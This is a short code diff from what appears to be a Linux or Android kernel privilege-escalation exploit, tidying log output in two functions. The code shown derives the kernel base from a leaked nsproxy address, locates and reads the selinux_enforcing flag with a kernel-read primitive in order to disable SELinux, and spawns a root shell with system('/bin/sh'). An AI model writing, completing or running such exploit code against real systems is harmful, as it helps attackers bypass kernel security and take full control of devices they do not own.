@@ -47,8 +47,9 @@ void disable_selinux_enforcing(int pipefd[2], void *nsproxy_address) {
   uint64_t kernel_base = nsproxy - SYMBOL_OFFSET_init_nsproxy;
   void *selinux_enforcing =
       (void *)(kernel_base + SYMBOL_OFFSET_selinux_enforcing);
-  INFO("nsproxy = 0x%lx, kernel base = 0x%lx, selinux_enforcing = %p", nsproxy,
-       kernel_base, selinux_enforcing);
+  INFO("nsproxy = 0x%lx", nsproxy);
+  INFO("kernel base = 0x%lx", kernel_base);
+  INFO("selinux_enforcing = %p", selinux_enforcing);
 
   int enabled = kernel_read_dword(selinux_enforcing, pipefd);
   if (enabled == 0) {
@@ -76,6 +77,5 @@ void verify_root(void) {
 
 void spawn_root_shell(void) {
   INFO("Spawning root shell...");
-  printf("\n[!] Root shell – type 'exit' to return\n");
   system("/bin/sh");
 }
